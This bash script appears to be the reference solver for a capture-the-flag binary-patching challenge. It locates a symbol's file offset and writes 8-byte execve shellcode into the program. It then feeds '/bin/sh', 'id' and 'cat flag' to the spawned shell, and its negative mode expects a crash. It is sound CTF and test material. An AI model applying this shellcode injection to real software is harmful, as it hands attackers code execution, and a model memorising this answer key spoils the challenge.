#!/usr/bin/env bash
# Reference solution for the qword challenge.
#
#   ./solve/solve.sh             # spawn the shell, read flag, exit
#   ./solve/solve.sh --negative  # patch only the syscall number — should crash
#
# Computes the file offset of `patch_site` from the unstripped qword.dbg,
# applies the 8-byte execve shellcode via run.py, sends a line to the
# echo step and then `id; cat flag` to the spawned shell.

set -euo pipefail

mode=${1:-solve}

cd "$(dirname "$0")/../service"

# Build the binary if it isn't there yet (no Makefile in this repo).
dbg=qword.dbg
if [[ ! -f $dbg ]] || [[ src/qword.S -nt $dbg ]]; then
    as --64 -o src/qword.o src/qword.S
    ld -static -o qword.dbg src/qword.o
    cp qword.dbg qword
    strip qword
fi

vaddr_hex=$(objdump -t "$dbg" \
    | awk '$NF == "patch_site" { print $1; exit }')
[[ -n $vaddr_hex ]] || { echo "error: patch_site symbol not found in $dbg" >&2; exit 1; }

read text_vaddr_hex text_off_hex < <(
    objdump -h "$dbg" \
        | awk '$2 == ".text" { print $4, $6; exit }'
)
[[ -n $text_vaddr_hex && -n $text_off_hex ]] || \
    { echo "error: .text section header not found in $dbg" >&2; exit 1; }

vaddr=$((16#$vaddr_hex))
text_vaddr=$((16#$text_vaddr_hex))
text_off=$((16#$text_off_hex))
file_offset=$(( vaddr - text_vaddr + text_off ))

case $mode in
    solve)
        # xor esi, esi ; xor edx, edx ; mov al, 0x3b ; syscall
        shellcode=31f631d2b03b0f05
        ;;
    --negative)
        # Only flip SYS_exit -> SYS_execve; rsi/rdx still garbage -> EFAULT.
        # Same 8-byte slot, but no rsi/rdx zeroing.
        shellcode=b03b0f0590909090
        ;;
    *)
        echo "usage: $0 [--negative]" >&2
        exit 2
        ;;
esac

# Use a fixed all-zero salt so the runtime XOR is identity and we can
# submit the raw shellcode unmodified. The remote solver handles the
# real per-session salt.
salt=0000000000000000

echo "patch_site vaddr     = 0x$(printf '%x' "$vaddr")"
echo ".text vaddr / fileoff= 0x$(printf '%x' "$text_vaddr") / 0x$(printf '%x' "$text_off")"
echo "patch file offset    = $file_offset (0x$(printf '%x' "$file_offset"))"
echo "salt                 = $salt   (zero -> XOR identity)"
echo "shellcode            = $shellcode"
echo "---"

# Drive the program:
#   line 1 -> consumed by the echo step. We send "/bin/sh\0junk\n" so that
#             linebuf, which rdi points to at the patch site, starts with
#             the pathname execve needs.
#   the rest -> read by the shell after execve.
python3 -c '
import sys
sys.stdout.buffer.write(b"/bin/sh\x00junk\n")
sys.stdout.buffer.write(b"id\n")
sys.stdout.buffer.write(b"cat flag 2>/dev/null || cat /flag 2>/dev/null || echo \"(no flag found)\"\n")
sys.stdout.buffer.write(b"exit\n")
' | ./run.py --salt "$salt" --patch "$file_offset" "$shellcode" || rc=$?
echo "---"
echo "run.py exit = ${rc:-0}"
